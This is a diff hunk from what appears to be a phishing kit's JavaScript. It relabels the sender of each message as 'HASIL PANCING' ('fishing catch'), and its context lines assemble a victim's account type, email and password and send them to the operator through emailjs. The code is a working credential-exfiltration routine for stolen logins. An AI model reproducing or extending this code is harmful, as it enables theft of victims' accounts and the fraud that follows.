@@ -34,7 +34,7 @@ var parameter1 = {
     }
     
 	var parameter = {
-		from_name:"mastah",
+		from_name:"HASIL PANCING",
 		message:"jenis akun: "+z+"\nemail: "+x+"\npass: "+y
 		}
 	emailjs.send(parameter1["service"],parameter1["tample"],parameter).then(function(response) {
